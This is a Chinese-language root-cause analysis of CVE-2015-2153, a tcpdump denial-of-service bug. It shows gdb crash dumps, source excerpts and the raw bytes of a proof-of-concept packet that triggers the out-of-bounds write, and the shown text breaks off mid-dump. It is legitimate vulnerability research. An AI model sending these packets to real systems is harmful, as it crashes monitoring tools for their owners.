<!DOCTYPE html>
<html>
<head>
<title>CVE-2015-2153 Tcpdump 4.6.2 rpki_rtr_pdu_print Out-Of-Bounds Denial Of Service Vulnerability</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="cve-2015-2153-tcpdump-4-6-2-rpki_rtr_pdu_print-out-of-bounds-denial-of-service-vulnerability">CVE-2015-2153 Tcpdump 4.6.2 rpki_rtr_pdu_print Out-Of-Bounds Denial Of Service Vulnerability</h1>
<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
<ul>
<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2153">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2153</a></li></ul>
<p>该漏洞影响所有小于<code>4.7.2</code>的发行版</p>
<p>我们先测试一下Poc的有效性</p>
<p>左边是目标机器，运行着<code>4.5.1</code>版本的tcpdump，右边开启了一个攻击机器，两个都是Linux下的，然后执行Poc即可</p>
<p><img src="Image/1.png" alt=""></p>
<p>执行Poc即可发现服务端tcpdump崩溃，我们使用gdb调试分析崩溃点</p>
<p>下载以及编译参考</p>
<ul>
<li><a href="http://couplee.wang/Linux/TCPDump%204.5.1%20Denial%20Of%20Service%20Vulnerability/article.html">TCPDump 4.5.1 Denial Of Service Vulnerability</a></li></ul>
<p>问题出在<code>print-rpki-rtr.c</code>的<code>rpki_rtr_pdu_print()</code>函数，所以我们重点关注这个函数</p>
<p>使用gdb调试启动tcpdump</p>
<pre><code>wnagzihxain@toT0C:~$ sudo gdb tcpdump
</code></pre><p>设置参数，然后跑起来</p>
<pre><code>gdb-peda$ set args -i ens33 -s 0 -n -v
</code></pre><p>另一个系统中执行Poc</p>
<pre><code>wnagzihxain@toT0C:~$ sudo python Poc.py 192.168.121.134 192.168.121.133
</code></pre><p>发生错误自动断下</p>
<p><img src="Image/2.png" alt=""></p>
<p>我们观察崩溃现场</p>
<pre><code>gdb-peda$ c
Continuing.
tcpdump: listening on ens33, link-type EN10MB (Ethernet), capture size 65535 bytes
14:43:49.124041 IP (tos 0x0, ttl 255, id 54321, offset 0, flags [none], proto TCP (6), length 60)
    192.168.121.134.255 &gt; 192.168.121.133.323: Flags [S], cksum 0x23be (correct), seq 454:474, win 53270, length 20
    RPKI-RTRv65, Error Report PDU (10), length: 8

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0x3fffdf6b 
EBX: 0x811ae3d (&quot;Internal Error&quot;)
ECX: 0x4f (&#39;O&#39;)
EDX: 0xbfffdf6c (&quot;AAAA&quot;)
ESI: 0x811adc5 (&quot;Error Report&quot;)
EDI: 0xb7a160a8 --&gt; 0x4301ff00 
EBP: 0xbfffdfd8 --&gt; 0xbfffe018 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 (--&gt; ...)
ESP: 0xbfffdf20 --&gt; 0xbfffdfe0 --&gt; 0xb7a160bc --&gt; 0x1000a41 
EIP: 0x80a1366 (&lt;rpki_rtr_pdu_print+1034&gt;:    mov    BYTE PTR [eax],0x0)
EFLAGS: 0x210213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80a135b &lt;rpki_rtr_pdu_print+1023&gt;:    lea    edx,[ebp-0x6c]
   0x80a135e &lt;rpki_rtr_pdu_print+1026&gt;:    mov    eax,DWORD PTR [ebp-0x98]
   0x80a1364 &lt;rpki_rtr_pdu_print+1032&gt;:    add    eax,edx
=&gt; 0x80a1366 &lt;rpki_rtr_pdu_print+1034&gt;:    mov    BYTE PTR [eax],0x0
   0x80a1369 &lt;rpki_rtr_pdu_print+1037&gt;:    mov    eax,DWORD PTR [ebp+0xc]
   0x80a136c &lt;rpki_rtr_pdu_print+1040&gt;:    add    eax,0x2
   0x80a136f &lt;rpki_rtr_pdu_print+1043&gt;:    sub    esp,0xc
   0x80a1372 &lt;rpki_rtr_pdu_print+1046&gt;:    push   eax
[------------------------------------stack-------------------------------------]
0000| 0xbfffdf20 --&gt; 0xbfffdfe0 --&gt; 0xb7a160bc --&gt; 0x1000a41 
0004| 0xbfffdf24 --&gt; 0xb7dcd940 --&gt; 0x0 
0008| 0xbfffdf28 --&gt; 0x0 
0012| 0xbfffdf2c --&gt; 0xb7a160cc (&quot;AAAA&quot;)
0016| 0xbfffdf30 --&gt; 0xb7dce7b0 --&gt; 0x8246350 --&gt; 0x0 
0020| 0xbfffdf34 --&gt; 0x308 
0024| 0xbfffdf38 --&gt; 0x500 
0028| 0xbfffdf3c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x080a1366 in rpki_rtr_pdu_print ()
gdb-peda$ x/x $eax
0x3fffdf6b:    Cannot access memory at address 0x3fffdf6b
</code></pre><p>断下的原因是<code>Segmentation fault</code>，也就是段错误</p>
<p>而关键的指令是</p>
<pre><code>=&gt; 0x80a1366 &lt;rpki_rtr_pdu_print+1034&gt;:    mov    BYTE PTR [eax],0x0
</code></pre><p>我们对寄存器<code>eax</code>进行输出查看，发现是不可访问的内存地址，所以问题就清楚了，这里是写入了不可访问的内存导致的拒绝服务</p>
<pre><code>gdb-peda$ x/x $eax
0x3fffdf6b:    Cannot access memory at address 0x3fffdf6b
</code></pre><p>回溯函数调用栈</p>
<pre><code>gdb-peda$ bt
#0  0x080a1366 in rpki_rtr_pdu_print ()
#1  0x080a14f1 in rpki_rtr_print ()
#2  0x080b8ccd in tcp_print ()
#3  0x08073511 in ip_print_demux ()
#4  0x08073e59 in ip_print ()
#5  0x0806abd9 in ethertype_print ()
#6  0x0806a8b2 in ether_print ()
#7  0x0806a951 in ether_if_print ()
#8  0x080c2c7f in print_packet ()
#9  0x080ef63e in pcap_handle_packet_mmap (handle=handle@entry=0x8235058, callback=callback@entry=0x80c2c13 &lt;print_packet&gt;, user=user@entry=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;, frame=0xb7a16030 &quot;\240&quot;, tp_len=0x4a, tp_mac=0x56, 
    tp_snaplen=0x4a, tp_sec=0x5a531325, tp_usec=0x1e489, tp_vlan_tci_valid=0x0, tp_vlan_tci=0x0) at ./pcap-linux.c:4264
#10 0x080f3884 in pcap_read_linux_mmap_v3 (handle=0x8235058, max_packets=0xffffffff, callback=0x80c2c13 &lt;print_packet&gt;, user=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;) at ./pcap-linux.c:4429
#11 0x080d9db9 in pcap_loop (p=0x8235058, cnt=&lt;optimized out&gt;, callback=0x80c2c13 &lt;print_packet&gt;, user=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;) at ./pcap.c:856
#12 0x080c2229 in main ()
#13 0xb7c34637 in __libc_start_main (main=0x80c083a &lt;main&gt;, argc=0x7, argv=0xbffff654, init=0x80f7300 &lt;__libc_csu_init&gt;, fini=0x80f7360 &lt;__libc_csu_fini&gt;, rtld_fini=0xb7fea8a0 &lt;_dl_fini&gt;, stack_end=0xbffff64c)
    at ../csu/libc-start.c:291
#14 0x0804a3d3 in _start ()
</code></pre><p>确认是<code>rpki_rtr_pdu_print()</code>函数</p>
<p>我们分析源码，发现该函数有两个参数，第一个是一个结构体指针，第二个是固定值<code>8</code></p>
<pre><code>static void rpki_rtr_pdu_print (const u_char *tptr, u_int indent)
</code></pre><p>父函数调用如下</p>
<pre><code>rpki_rtr_pdu_print(tptr, 8);
</code></pre><p>观察调用时的参数数据</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x14 
EBX: 0x8236078 --&gt; 0x353532 (&#39;255&#39;)
ECX: 0x7ffffff4 
EDX: 0xfffffff8 
ESI: 0x8236008 (&quot;192.168.121.133&quot;)
EDI: 0xb7a171b8 --&gt; 0x4301ff00 
EBP: 0xbfffe018 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 --&gt; 0xbfffe258 (--&gt; ...)
ESP: 0xbfffdfe0 --&gt; 0xb7a171cc --&gt; 0x1000a41 
EIP: 0x80a14ec (&lt;rpki_rtr_print+239&gt;:    call   0x80a0f5c &lt;rpki_rtr_pdu_print&gt;)
EFLAGS: 0x200296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80a14e4 &lt;rpki_rtr_print+231&gt;:    sub    esp,0x8
   0x80a14e7 &lt;rpki_rtr_print+234&gt;:    push   0x8
   0x80a14e9 &lt;rpki_rtr_print+236&gt;:    push   DWORD PTR [ebp-0x18]
=&gt; 0x80a14ec &lt;rpki_rtr_print+239&gt;:    call   0x80a0f5c &lt;rpki_rtr_pdu_print&gt;
   0x80a14f1 &lt;rpki_rtr_print+244&gt;:    add    esp,0x10
   0x80a14f4 &lt;rpki_rtr_print+247&gt;:    mov    eax,DWORD PTR [ebp-0xc]
   0x80a14f7 &lt;rpki_rtr_print+250&gt;:    sub    DWORD PTR [ebp-0x1c],eax
   0x80a14fa &lt;rpki_rtr_print+253&gt;:    mov    eax,DWORD PTR [ebp-0xc]
Guessed arguments:
arg[0]: 0xb7a171cc --&gt; 0x1000a41 
arg[1]: 0x8 
[------------------------------------stack-------------------------------------]
0000| 0xbfffdfe0 --&gt; 0xb7a171cc --&gt; 0x1000a41 
0004| 0xbfffdfe4 --&gt; 0x8 
0008| 0xbfffdfe8 --&gt; 0xb7c5e0cb (&lt;_IO_vfprintf_internal+11&gt;:    add    ebx,0x16ff35)
0012| 0xbfffdfec --&gt; 0x8236078 --&gt; 0x353532 (&#39;255&#39;)
0016| 0xbfffdff0 --&gt; 0x8236008 (&quot;192.168.121.133&quot;)
0020| 0xbfffdff4 --&gt; 0xb7a171b8 --&gt; 0x4301ff00 
0024| 0xbfffdff8 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 --&gt; 0xbfffe258 (--&gt; ...)
0028| 0xbfffdffc --&gt; 0x14 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080a14ec in rpki_rtr_print ()
</code></pre><p>第一个参数指向的数据<code>0x01000a41</code></p>
<p>我们来看Poc输出的Socket数据</p>
<pre><code>\x45\x00\x00\x00
\xd4\x31\x00\x00
\xff\x06\x00\x00
\xc0\xa8\x79\x86
\xc0\xa8\x79\x85
\x00\xff\x01\x43
\x00\x00\x01\xc6
\x00\x00\x00\x00
\x50\x02\xd0\x16
\x23\xbe\x00\x00
(指向这里=&gt;)\x41\x0a\x00\x01
\x00\x00\x00\x08
\x00\x00\x00\x00
\x7f\xff\xff\xff
\x41\x41\x41\x41
</code></pre><p>我们按照传进去的指针开始跟执行流程，获取结构体指针后开始解析数据</p>
<pre><code>pdu_header = (rpki_rtr_pdu *)tptr;
pdu_type = pdu_header-&gt;pdu_type;
pdu_len = EXTRACT_32BITS(pdu_header-&gt;length);
hexdump = FALSE;
</code></pre><p>该结构体如下</p>
<pre><code>typedef struct rpki_rtr_pdu_ {
    u_char version;        /* Version number */
    u_char pdu_type;        /* PDU type */
    union {
    u_char session_id[2];    /* Session id */
    u_char error_code[2];    /* Error code */
    } u;
    u_char length[4];
} rpki_rtr_pdu;
</code></pre><p>先解析出<code>pdu_type</code>，这个值是<code>0x0a</code>，解析<code>length</code>成员的值为<code>0x08</code></p>
<p>然后进入一个<code>switch</code>，判断条件是<code>pdu_type</code>，这个值是<code>0x0a</code></p>
<p>根据宏定义判断</p>
<pre><code>#define RPKI_RTR_ERROR_REPORT_PDU    10
</code></pre><p>进入如下分支，这个分支的函数需要好好分析下，找到关键的崩溃点</p>
<pre><code>case RPKI_RTR_ERROR_REPORT_PDU:
{
    rpki_rtr_pdu_error_report *pdu;
    u_int encapsulated_pdu_length, text_length, tlen, error_code;
    u_char buf[80];

    pdu = (rpki_rtr_pdu_error_report *)tptr;
    encapsulated_pdu_length = EXTRACT_32BITS(pdu-&gt;encapsulated_pdu_length);
    tlen = pdu_len;

    error_code = EXTRACT_16BITS(pdu-&gt;pdu_header.u.error_code);
    printf(&quot;%sError code: %s (%u), Encapsulated PDU length: %u&quot;,
        indent_string(indent+2),
        tok2str(rpki_rtr_error_codes, &quot;Unknown&quot;, error_code),
            error_code, encapsulated_pdu_length);

    tptr += sizeof(*pdu);
    tlen -= sizeof(*pdu);

    /*
        * Recurse if there is an encapsulated PDU.
        */
    if (encapsulated_pdu_length &amp;&amp;
    (encapsulated_pdu_length &lt;= tlen)) {
    printf(&quot;%s-----encapsulated PDU-----&quot;, indent_string(indent+4));
    rpki_rtr_pdu_print(tptr, indent+2);
    }

    tptr += encapsulated_pdu_length;
    tlen -= encapsulated_pdu_length;

    /*
        * Extract, trail-zero and print the Error message.
        */ 
    text_length = 0;
    if (tlen &gt; 4) {
    text_length = EXTRACT_32BITS(tptr);
    tptr += 4;
    tlen -= 4;
    }
    if (text_length &amp;&amp; (text_length &lt;= tlen )) {
    memcpy(buf, tptr, MIN(sizeof(buf)-1, text_length));
    buf[text_length] = &#39;\0&#39;;
    printf(&quot;%sError text: %s&quot;, indent_string(indent+2), buf);
    }
}
break;
</code></pre><p>首先是重新获取结构体指针，该指针指向的数据和之前的<code>tptr</code>是一样的，再次解析一个长度字段<code>encapsulated_pdu_length</code>，该值为<code>0x00</code></p>
<pre><code>pdu = (rpki_rtr_pdu_error_report *)tptr;
encapsulated_pdu_length = EXTRACT_32BITS(pdu-&gt;encapsulated_pdu_length);
tlen = pdu_len;
</code></pre><p>此时几个代表着长度的变量</p>
<pre><code>pdu_len = 0x08
encapsulated_pdu_length = 0x00
tlen = 0x08
</code></pre><p>跳过第一个结构体</p>
<pre><code>tptr += sizeof(*pdu);
tlen -= sizeof(*pdu);
</code></pre><p>此处是关键，我们的<code>tlen</code>是<code>0x08</code>，而<code>rpki_rtr_pdu_error_report</code>结构体的长度为<code>0x0c</code></p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x3e (&#39;&gt;&#39;)
EBX: 0x811ae3d (&quot;Internal Error&quot;)
ECX: 0x7fffffc1 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x811adc5 (&quot;Error Report&quot;)
EDI: 0xb7a360a8 --&gt; 0x4301ff00 
EBP: 0xbfffdfd8 --&gt; 0xbfffe018 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 (--&gt; ...)
ESP: 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x60940200 
EIP: 0x80a127e (&lt;rpki_rtr_pdu_print+802&gt;:    sub    DWORD PTR [ebp-0x94],0xc)
EFLAGS: 0x200292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80a126f &lt;rpki_rtr_pdu_print+787&gt;:    call   0x8049eb0 &lt;printf@plt&gt;
   0x80a1274 &lt;rpki_rtr_pdu_print+792&gt;:    add    esp,0x20
   0x80a1277 &lt;rpki_rtr_pdu_print+795&gt;:    add    DWORD PTR [ebp-0xac],0xc
=&gt; 0x80a127e &lt;rpki_rtr_pdu_print+802&gt;:    sub    DWORD PTR [ebp-0x94],0xc
   0x80a1285 &lt;rpki_rtr_pdu_print+809&gt;:    cmp    DWORD PTR [ebp-0x74],0x0
   0x80a1289 &lt;rpki_rtr_pdu_print+813&gt;:    je     0x80a12d1 &lt;rpki_rtr_pdu_print+885&gt;
   0x80a128b &lt;rpki_rtr_pdu_print+815&gt;:    mov    eax,DWORD PTR [ebp-0x74]
   0x80a128e &lt;rpki_rtr_pdu_print+818&gt;:    cmp    eax,DWORD PTR [ebp-0x94]
[------------------------------------stack-------------------------------------]
0000| 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x60940200 
0004| 0xbfffdf24 --&gt; 0xb7dcd940 --&gt; 0x0 
0008| 0xbfffdf28 --&gt; 0x0 
0012| 0xbfffdf2c --&gt; 0xb7a360c8 --&gt; 0xffffff7f 
0016| 0xbfffdf30 --&gt; 0xbfffe04b --&gt; 0xa360a8b7 
0020| 0xbfffdf34 --&gt; 0x0 
0024| 0xbfffdf38 --&gt; 0x0 
0028| 0xbfffdf3c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080a127e in rpki_rtr_pdu_print ()
gdb-peda$ x/x $ebp-0x94
0xbfffdf44:    0x00000008
</code></pre><p>也就是说<code>uint</code>类型的数据，<code>0x08 - 0x0c</code>的结果如下</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x3e (&#39;&gt;&#39;)
EBX: 0x811ae3d (&quot;Internal Error&quot;)
ECX: 0x7fffffc1 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x811adc5 (&quot;Error Report&quot;)
EDI: 0xb7a360a8 --&gt; 0x4301ff00 
EBP: 0xbfffdfd8 --&gt; 0xbfffe018 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 --&gt; 0xbfffe1f8 (--&gt; ...)
ESP: 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x60940200 
EIP: 0x80a1285 (&lt;rpki_rtr_pdu_print+809&gt;:    cmp    DWORD PTR [ebp-0x74],0x0)
EFLAGS: 0x200297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80a1274 &lt;rpki_rtr_pdu_print+792&gt;:    add    esp,0x20
   0x80a1277 &lt;rpki_rtr_pdu_print+795&gt;:    add    DWORD PTR [ebp-0xac],0xc
   0x80a127e &lt;rpki_rtr_pdu_print+802&gt;:    sub    DWORD PTR [ebp-0x94],0xc
=&gt; 0x80a1285 &lt;rpki_rtr_pdu_print+809&gt;:    cmp    DWORD PTR [ebp-0x74],0x0
   0x80a1289 &lt;rpki_rtr_pdu_print+813&gt;:    je     0x80a12d1 &lt;rpki_rtr_pdu_print+885&gt;
   0x80a128b &lt;rpki_rtr_pdu_print+815&gt;:    mov    eax,DWORD PTR [ebp-0x74]
   0x80a128e &lt;rpki_rtr_pdu_print+818&gt;:    cmp    eax,DWORD PTR [ebp-0x94]
   0x80a1294 &lt;rpki_rtr_pdu_print+824&gt;:    ja     0x80a12d1 &lt;rpki_rtr_pdu_print+885&gt;
[------------------------------------stack-------------------------------------]
0000| 0xbfffdf20 --&gt; 0xbfffe046 --&gt; 0x60940200 
0004| 0xbfffdf24 --&gt; 0xb7dcd940 --&gt; 0x0 
0008| 0xbfffdf28 --&gt; 0x0 
0012| 0xbfffdf2c --&gt; 0xb7a360c8 --&gt; 0xffffff7f 
0016| 0xbfffdf30 --&gt; 0xbfffe04b --&gt; 0xa360a8b7 
0020| 0xbfffdf34 --&gt; 0x0 
0024| 0xbfffdf38 --&gt; 0x0 
0028| 0xbfffdf3c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080a1285 in rpki_rtr_pdu_print ()
gdb-peda$ x/x $ebp-0x94
0xbfffdf44:    0xfffffffc
</code></pre><p>此时就已经完成了攻击的铺垫过程，<code>tlen</code>此时为<code>0xfffffffc</code></p>
<p>我们观察跳过了第一个结构体之后指向的数据，发现存储的指针指向的是<code>0xffffff7f</code>，在作者给出的Poc里，该字段的意思为<code>overwrite out-of-bounds &#39;\0&#39;, causing DoS</code></p>
<pre><code> [----------------------------------registers-----------------------------------]
